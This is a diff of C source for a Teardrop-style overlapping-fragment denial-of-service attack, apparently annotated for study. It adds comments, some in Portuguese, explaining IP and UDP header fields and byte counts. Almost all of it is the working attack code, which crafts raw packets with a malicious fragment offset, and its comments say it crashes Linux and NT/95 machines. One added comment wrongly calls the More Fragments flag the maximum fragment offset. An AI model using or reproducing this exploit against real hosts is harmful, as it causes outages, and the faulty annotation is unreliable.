@@ -30,16 +30,15 @@
  #else 
     #define FIX(n) htons(n) 
  #endif 
- #define IP_MF 0x2000 /* More IP fragment en route */ 
- #define IPH 0x14 /* IP header size */ 
+ #define IP_MF 0x2000 /* 8192_10, tamanho maximo do Fragment Offset: More IP fragment en route */ 
+ #define IPH 0x14 /* 20_10, IP header size */ 
  #define UDPH 0x8 /* UDP header size */ 
- #define PADDING 0x1c /* datagram frame padding for first packet */ 
+ #define PADDING 0x1c /* 28_10, datagram frame padding for first packet */ 
  #define MAGIC 0x3 /* Magic Fragment Constant (tm). Should be 2 or 3 */ 
  #define COUNT 0x1 /* Linux dies with 1, NT is more stalwart and can withstand maybe 5 or 10 sometimes... Experiment. */ 
 
  void usage(u_char *); 
  u_long name_resolve(u_char *); 
- u_short in_cksum(u_short *, int); 
  void send_frags(int, u_long, u_long, u_short, u_short); 
 
  int main(int argc, char **argv) { 
@@ -117,28 +116,38 @@ void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt, u_short
     p_ptr = packet; 
     bzero((u_char *)p_ptr, IPH + UDPH + PADDING);
 
-    byte = 0x45; /* IP version and header length */ 
+    byte = 0x45; /* 0100_0101 IP version 4 and header length 5 32-bit words */ 
     memcpy(p_ptr, &byte, sizeof(u_char)); 
-    p_ptr += 2; /* IP TOS (skipped) */ 
-    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING); /* total length */ 
+
+    p_ptr += 2; /* IP TypeOfService (skipped) */ 
+    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING); /* IP total length 56 bytes*/ 
+
     p_ptr += 2; 
     *((u_short *)p_ptr) = htons(242); /* IP id */ 
+
     p_ptr += 2; 
-    *((u_short *)p_ptr) |= FIX(IP_MF); /* IP frag flags and offset */ 
+    *((u_short *)p_ptr) |= FIX(IP_MF); /* IP fragmentation flags and offset 001_0...0 */ 
+
     p_ptr += 2; 
     *((u_short *)p_ptr) = 0x40; /* IP TTL */ 
+
     byte = IPPROTO_UDP; 
-    memcpy(p_ptr + 1, &byte, sizeof(u_char)); 
+    memcpy(p_ptr + 1, &byte, sizeof(u_char)); /* IP Protocol */ 
+
     p_ptr += 4; /* IP checksum filled in by kernel */ 
     *((u_long *)p_ptr) = src_ip; /* IP source address */ 
+
     p_ptr += 4; 
     *((u_long *)p_ptr) = dst_ip; /* IP destination address */ 
+
     p_ptr += 4; 
     *((u_short *)p_ptr) = htons(src_prt); /* UDP source port */ 
+
     p_ptr += 2; 
     *((u_short *)p_ptr) = htons(dst_prt); /* UDP destination port */ 
+
     p_ptr += 2; 
-    *((u_short *)p_ptr) = htons(8 + PADDING); /* UDP total length */ 
+    *((u_short *)p_ptr) = htons(UDPH + PADDING); /* UDP total length 36 bytes */ 
     
     if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr)) == -1) { 
         perror("\nsendto"); 
@@ -152,10 +161,10 @@ void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt, u_short
     * do, but to crash NT/95 machines, a bit larger of packet seems to work 
     * better. 
     */ 
-    p_ptr = &packet[2]; /* IP total length is 2 bytes into the header */ 
-    *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1); 
-    p_ptr += 4; /* IP offset is 6 bytes into the header */ 
-    *((u_short *)p_ptr) = FIX(MAGIC);
+    p_ptr = &packet[2]; 
+    *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1); /* IP total length 24 bytes */ 
+    p_ptr += 4; 
+    *((u_short *)p_ptr) = FIX(MAGIC); /* IP offset is 3 bytes */ 
 
     if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr)) == -1) { 
         perror("\nsendto"); 
